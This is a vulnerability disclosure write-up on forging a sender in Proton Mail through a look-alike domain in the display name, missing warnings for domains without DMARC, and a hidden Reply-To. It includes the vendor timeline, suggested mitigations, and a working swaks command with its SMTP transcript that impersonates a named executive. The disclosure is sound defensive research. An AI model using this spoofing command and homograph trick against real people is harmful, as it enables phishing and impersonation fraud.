# Sender spoofing in Proton Mail via display-name homograph

**Status:** Reported to Proton Security on 13 February 2025. Confirmed and
bounty-awarded by Proton in April 2025. Still reproducible as of September 2026.

---

## Issue description

Proton Mail's web interface can be made to present a forged sender identity that
is visually indistinguishable from a legitimate one. The problem combines three
weaknesses:

1. **Display-name text is shown in the position users read as the sender's
   address.** An attacker controls the `From` display name entirely and can put
   an address-shaped string there (e.g. a full `name@domain.com`). The interface
   surfaces that string prominently and does not force the actual envelope/header
   address into view.

2. **The default interface font makes distinct characters identical.** The UI
   font stack resolves to the OS system font (SF Pro on macOS), in which capital
   `I` and lowercase `l` render identically. A domain such as `gmaiI.com`
   (capital i) is indistinguishable from `gmail.com` to any reader, including a
   careful one. Proton has protections against several encoding-based homograph
   classes but not against this basic same-font case.

3. **No authentication-failure banner is shown for sender domains without a
   DMARC record.** When a message fails SPF from a domain that *does* publish
   DMARC, Proton displays a "failed authentication / may be spoofed" banner. When
   the sender domain has *no* DMARC record, the message is delivered to the inbox
   with no banner and no other flag. The inconsistency means the spoofed message
   arrives looking fully clean.

Taken together, a message can arrive in a Proton inbox appearing to come from a
real, named person at a real domain, with no visual cue anywhere in the interface
that anything is wrong. A `Reply-To` alias can also be set so a reply reaches an
attacker-controlled address without that address being visible unless the user
expands the header manually.

## How to reproduce

The finding was demonstrated end-to-end against the reporter's own Proton
accounts, using a standard SMTP testing client (swaks) over Proton's inbound MX
with STARTTLS. No unsolicited messages were sent to other Proton users.

The relevant properties of the crafted message:

- **envelope sender:** an address on a domain that publishes no DMARC record
- **`From:` display name:** a full, address-shaped string on a look-alike domain
  (`gmaiI.com`, capital i, reading as `gmail.com`), presented as a well-known
  real person. This can be reproduced with other domains using the same technic
- **`Reply-To:`** pointing at an unrelated, attacker-controlled address

Result: SPF evaluation fails, but because the sending domain publishes no DMARC
policy, no authentication-failure banner is rendered. Proton's inbound server
accepts the message (`250 ... Ok: queued`) and delivers it to the inbox. In the
rendered message, the look-alike string appears where the reader expects the
sender address, and in the default macOS UI font it is pixel-identical to the
legitimate domain.

To confirm the font issue independently: render `gmail.com` and `gmaiI.com`
(capital i) side by side in SF Pro or any `system-ui` sans-serif and compare.

## Evidence:

The spoofed message in the inbox, with no authentication warning:

<img width="1055" height="101" alt="Screenshot 2026-09-07 at 18 47 37" src="https://github.com/user-attachments/assets/b6e0996f-b24b-4ed1-8c92-825436b4cf13" />

The opened message showing the look-alike sender in the address position:

<img width="1339" height="394" alt="Screenshot 2026-09-07 at 18 47 47" src="https://github.com/user-attachments/assets/b7131360-dd56-40e2-bc6d-90063b957ab7" />

The macOS desktop notification for the spoofed message, showing the forged sender (`"Real Sundar Pichai"  sundar@gmaiI.com`) rendered at the OS level, outside the app entirely

<img width="413" height="175" alt="Screenshot 2026-09-07 at 19 12 53" src="https://github.com/user-attachments/assets/adbb5a04-dd21-4a7b-abd5-b1f180585b63" />


```
$ swaks --to alovida@proton.me  --from 'alonso@gmail.com'  --h-From '"Real Sundar Pichai" sundar@gmaiI.com'  --add-header 'Reply-To: The Real Email <my_real_email@gmail.com>'  --server mail.protonmail.ch:25 --tls  --body "test"
=== Trying mail.protonmail.ch:25...
=== Connected to mail.protonmail.ch.
<-  220-mailinzur105.protonmail.ch ESMTP Postfix
<-  220 mailinzur105.protonmail.ch ESMTP Postfix
 -> EHLO tras2.es
<-  250-mailinzur105.protonmail.ch
<-  250-PIPELINING
<-  250-SIZE 71500000
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 CHUNKING
 -> STARTTLS
<-  220 2.0.0 Ready to start TLS
=== TLS started with cipher TLSv1.3:TLS_AES_256_GCM_SHA384:256
=== TLS client certificate not requested and not sent
=== TLS no client certificate set
=== TLS peer[0]   subject=[/CN=protonmail.com]
===               commonName=[protonmail.com], subjectAltName=[DNS:*.pm.me, DNS:*.protonmail.ch, DNS:*.protonmail.com, DNS:*.protonvpn.ch, DNS:*.protonvpn.com, DNS:protonmail.com] notAfter=[2026-10-11T13:14:36Z]
=== TLS peer[1]   subject=[/C=US/O=Let's Encrypt/CN=YR1]
===               commonName=[YR1], subjectAltName=[] notAfter=[2028-09-02T23:59:59Z]
=== TLS peer[2]   subject=[/C=US/O=ISRG/CN=Root YR]
===               commonName=[Root YR], subjectAltName=[] notAfter=[2032-09-02T23:59:59Z]
=== TLS peer certificate passed CA verification, passed host verification (using host mail.protonmail.ch to verify)
 ~> EHLO tras2.es
<~  250-mailinzur105.protonmail.ch
<~  250-PIPELINING
<~  250-SIZE 71500000
<~  250-ENHANCEDSTATUSCODES
<~  250-8BITMIME
<~  250-CHUNKING
<~  250 REQUIRETLS
 ~> MAIL FROM:<alonso@gmail.com>
<~  250 2.1.0 Ok
 ~> RCPT TO:<alovida@proton.me>
<~  250 2.1.5 Ok
 ~> DATA
<~  354 End data with <CR><LF>.<CR><LF>
 ~> Date: Mon, 07 Sep 2026 17:12:33 +0000
 ~> To: alovida@proton.me
 ~> From: "Real Sundar Pichai" sundar@gmaiI.com
 ~> Subject: test Mon, 07 Sep 2026 17:12:33 +0000
 ~> Message-Id: <20260907171233.2356271@tras2.es>
 ~> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 ~> Reply-To: The Real Email <my_real_email@gmail.com>
 ~>
 ~> test
 ~>
 ~>
 ~> .
<~  250 2.0.0 Ok: queued as 4hdttH2j7xz5Q
 ~> QUIT
<~  221 2.0.0 Bye
=== Connection closed with remote host.
```

## Timeline of interactions with Proton Security

All correspondence was with `security@proton.me`. Dates as they appear in the
email thread.

| Date | Event |
|------|-------|
| **13 Feb 2025** | Initial report submitted with reproduction steps and headers. |
| **13 Feb 2025** | Proton requests properly formatted headers (SPF/DMARC info); reporter provides them. |
| **14 Feb 2025** | Proton acknowledges receipt: "I will share this with the appropriate team and get back to you." |
| **07 Apr 2025** | Reporter follows up asking for an update. |
| **08 Apr 2025** | Proton initially asks whether the message went to spam ("if yes, this is by design"). Reporter clarifies the message landed in the **inbox** with no alert, and links a demonstration video. |
| **09 Apr 2025** | Reporter asks whether they are cleared to disclose. Proton asks to see the writeup first; reporter shares the PDF. |
| **10 Apr 2025** | Proton: "We greatly appreciate the PDF… we will review with our team internally and get back to you ASAP." |
| **15 Apr 2025** | Proton: **"We have delved deeper… and have made the decision to institute changes in light of your findings,"** and awards a **$100 bounty** for the homograph-spoofing risk, plus an offer to add the reporter to the security contributors page. |
| **15 Apr 2025** | At the reporter's request, the bounty is donated to an animal shelter in Spain. |
| **16 Apr 2025** | Proton confirms the donation was sent and requests attribution details. |
| **17 Apr 2025** | Proton: **"I've sent in a request with our Content team; this should be done asap."** |
| *(fix expected)* | No fix shipped. |
| **30 Aug 2026** | Reporter reports the issue still reproduces, with an updated document and fresh screenshot. |
| **31 Aug 2026** | Proton replies that the finding does not qualify for the bug bounty program and "has already been reported," and asks the reporter to follow up in the original thread rather than opening a new one. Reporter notes this *is* the same issue they reported and were paid for a year earlier, and states intent to disclose. |
| **31 Aug 2026** | Proton: "We'll reach out and speak to the relevant Engineering team and follow up." |
| **Sep 2026** | Public disclosure. Proton's own disclosure policy asks researchers to wait 120 days after acknowledgement of receipt; that window closed in June 2025, ~15 months before this publication. |

## Why this is concerning

**Proton confirmed the issue, paid for it, promised a fix, and never shipped
one.** This is not a disputed finding or a wontfix. Proton's own emails accepted
the risk, awarded a bounty specifically for the homograph vector, and stated a
fix request had gone to the responsible team. Sixteen months later it still
reproduces. When re-reported in 2026, it was waved off as already-known — which
is exactly the point: it was known, accepted, and left unfixed.

**The whole value proposition of the product is trust in the sender.** Proton
markets itself on security and privacy. Email spoofing that produces a
pixel-perfect forged sender, delivered clean to the inbox with no warning, is
squarely in the threat model a privacy-focused mail provider is expected to
defend against. A convincing forged "from your bank" or "from a colleague"
message is the first move in most real phishing and business-email-compromise
attacks.

**The forgery escapes the application entirely.** The spoofed sender is not just
convincing inside the web interface — it propagates to the operating-system
notification, where it appears with no surrounding interface at all: no header
detail, no authentication indicator, no way to inspect anything. A user glancing
at a desktop notification sees only a trusted name and a legitimate-looking
address. This is the context in which people are least able to scrutinize a
message and most likely to act on reflex.

**The failure is one of interface, not cryptography — which makes it cheap to
exploit and cheap to fix.** No encoding tricks, no account compromise, no special
access. The cost to an attacker is close to zero. Mitigations are well
understood: don't render address-shaped display-name text in the address position
without showing the true address; normalize or warn on visually confusable
characters in sender-facing strings; apply consistent authentication-failure
signalling regardless of whether the sending domain publishes DMARC.

**Silence about exploitation.** When re-reported, there was no indication that
Proton had checked whether the technique had been used against real users in the
intervening period, or whether any customer had been targeted. For a mail
provider, "we consider this low priority" and "we have confirmed no users were
harmed" are very different statements, and only one of them was offered.

---

*All testing was conducted against the reporter's own Proton accounts. No
unsolicited messages were sent to other Proton users. Correspondence with Proton
Security is retained in full.*
